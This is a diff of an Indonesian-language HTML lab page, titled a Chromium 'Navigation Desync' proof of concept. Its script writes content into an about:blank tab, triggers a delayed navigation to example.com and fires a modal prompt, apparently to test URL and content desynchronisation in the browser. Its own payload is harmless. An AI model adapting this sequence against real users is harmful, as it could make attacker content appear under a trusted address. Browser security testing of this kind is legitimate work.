@@ -2,93 +2,129 @@
 <html lang="id">
 <head>
     <meta charset="utf-8">
-    <title>Navigation Sequence Lab</title>
+    <title>Chromium Navigation Desync - Advanced Lab POC</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
-            background-color: #0f172a;
-            color: #f8fafc;
+            background-color: #0b0f19;
+            color: #f1f5f9;
             font-family: system-ui, -apple-system, sans-serif;
             text-align: center;
             padding: 50px 20px;
+            margin: 0;
         }
-        .box {
+        .wrapper {
             background: #1e293b;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
-            max-width: 400px;
+            padding: 35px;
+            border-radius: 14px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            max-width: 420px;
             margin: 0 auto;
+            border: 1px solid #334155;
         }
-        button {
-            background-color: #3b82f6;
+        h2 {
+            font-size: 1.3rem;
+            color: #38bdf8;
+            margin-bottom: 10px;
+        }
+        p {
+            font-size: 0.85rem;
+            color: #94a3b8;
+            margin-bottom: 25px;
+        }
+        .btn-trigger {
+            background-color: #2563eb;
             color: white;
             border: none;
             padding: 14px 20px;
             font-size: 1rem;
-            font-weight: bold;
+            font-weight: 600;
             border-radius: 8px;
             cursor: pointer;
             width: 100%;
-            margin-top: 15px;
+            transition: background 0.2s;
         }
-        button:active {
-            background-color: #2563eb;
+        .btn-trigger:active {
+            background-color: #1d4ed8;
         }
-        .log {
-            margin-top: 15px;
-            font-size: 0.8rem;
-            color: #94a3b8;
+        .logger {
+            margin-top: 20px;
+            background: #020617;
+            border: 1px solid #1e293b;
+            border-radius: 6px;
+            padding: 12px;
             font-family: monospace;
+            font-size: 0.75rem;
+            color: #4ade80;
+            text-align: left;
+            height: 100px;
+            overflow-y: auto;
         }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <h2>Urutan Navigasi Lab</h2>
-        <p>1. Injeksi about:blank -> 2. Tulis "Hallo" -> 3. Navigasi ke example.com</p>
-        <button id="trigger">JALANKAN URUTAN</button>
-        <div id="log" class="log">Status: Menunggu aksi...</div>
+    <div class="wrapper">
+        <h2>Navigation Desync Lab</h2>
+        <p>Simulasi urutan pemicu asinkron & pemblokiran utas modal.</p>
+        <button id="launchBtn">JALANKAN POC</button>
+        <div id="logBox" class="logger">[System] Menunggu interaksi pengguna...</div>
     </div>
 
     <script>
-        document.getElementById('trigger').addEventListener('click', function() {
-            const logEl = document.getElementById('log');
-            logEl.innerText = "Status: Membuka about:blank...";
+        const logBox = document.getElementById('logBox');
 
-            // Membuka jendela baru dengan about:blank
-            let win = window.open('about:blank', '_blank');
+        function addLog(message) {
+            const timeStr = new Date().toLocaleTimeString();
+            logBox.innerHTML += `[${timeStr}] ${message}<br>`;
+            logBox.scrollTop = logBox.scrollHeight;
+        }
 
-            if (!win) {
-                logEl.innerText = "Status Gagal: Pop-up diblokir peramban.";
+        document.getElementById('launchBtn').addEventListener('click', function() {
+            addLog("Membuka jendela baru (about:blank)...");
+
+            // 1. Membuka jendela baru dengan konteks kosong
+            let newTab = window.open('about:blank', '_blank');
+
+            if (!newTab) {
+                addLog("ERROR: Pop-up diblokir oleh peramban.");
                 return;
             }
 
             try {
-                // Tahap 1 & 2: Menulis dokumen lokal "Hallo" ke dalam konteks kosong
-                win.document.open();
-                win.document.write(`
+                // 2. Menyuntikkan konten awal ke dalam dokumen kosong
+                newTab.document.open();
+                newTab.document.write(`
                     <!DOCTYPE html>
                     <html>
-                    <head><title>Local Injection</title></head>
-                    <body style="background:white; color:black; text-align:center; padding-top:60px; font-family:sans-serif;">
-                        <h1>Hallo</h1>
-                        <p>Konteks awal sebelum navigasi dialihkan.</p>
+                    <head><title>Injected View</title></head>
+                    <body style="background:#ffffff; color:#0f172a; text-align:center; padding-top:80px; font-family:sans-serif;">
+                        <h1 style="font-size: 3rem; color: #1e293b;">Hallo</h1>
+                        <p style="color: #64748b;">Konteks render awal sebelum navigasi dialihkan.</p>
                     </body>
                     </html>
                 `);
-                win.document.close();
-                logEl.innerText = "Status: Berhasil menulis 'Hallo'. Menyiapkan navigasi...";
+                newTab.document.close();
+                addLog("Konten 'Hallo' berhasil disuntikkan.");
 
-                // Tahap 3: Paksa tarik / alihkan ke example.com setelah jeda singkat
+                // 3. Memicu navigasi asinkron tertunda ke domain target (misal: example.com)
                 setTimeout(() => {
-                    logEl.innerText = "Status: Mengalihkan ke example.com...";
-                    win.location.replace("https://example.com");
-                }, 400);
+                    addLog("Memicu lokasi ke target eksternal...");
+                    newTab.location.href = "https://example.com";
+                }, 10);
+
+                // 4. Memicu dialog modal sinkronus untuk menguji penguncian utas utama (main thread)
+                setTimeout(() => {
+                    addLog("Mengeksekusi dialog modal (prompt)...");
+                    try {
+                        newTab.prompt("ROOT CAUSE / THREAD LOCK", "Verification");
+                    } catch (e) {
+                        addLog("Modal dibatasi oleh kebijakan keamanan sandbox.");
+                    }
+                }, 300);
 
             } catch (err) {
-                logEl.innerText = "Error: " + err.message;
+                addLog("EXCEPTION: " + err.message);
             }
         });
     </script>
